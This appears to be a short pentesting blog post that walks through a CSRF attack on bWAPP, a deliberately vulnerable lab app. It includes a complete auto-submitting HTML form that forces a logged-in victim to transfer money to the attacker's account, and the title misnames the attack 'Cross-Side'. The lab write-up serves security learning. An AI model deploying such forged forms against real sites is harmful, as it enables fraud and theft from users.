---
title: Cross-Side Request Forgery
date: 2022-01-01 05:49:33 +0800
categories: [WebApp And Api Pentesting, Cross-Side Request Forgery]
tags: []  
---

# Cross-Side Request Forgery (csrf)

# Exploitation

![csrf](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/csrf1.png)

This webapp is vulnerable to csrf which allows attacker to trick user into transfering money to his account.

we will first transfer `10 EUR` to `123-45678-90` to see how the webapp is working.

![csrf](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/csrf2.png)

Done. You can see we have been charged 10 EUR and our balance was `980 EUR`.

Let's repeat again with `100 EUR` and intercept the request in burp. We will use the intercepted request to create an csrf payload.

![csrf](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/csrf3.png)

By examing the request, our payload will be something like

```html

<html>

	<head>
	</head>
	<body> 
		<form action="http://192.168.43.14/bWAPP/csrf_2.php" method="GET">
			<input type="hidden" name="account" value="173-46078-907"/>
			<input type="hidden" name="amount" value="100"/>
			<input type="hidden" name="action" value="transfer"/>
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>

</html>

```
We will host the payload in our server and make the user visit our site.


![csrf](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/csrf4.png)

![csrf](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/csrf3.png)

As you can see, we have been charged 100 making our balance to `880 EUR`.
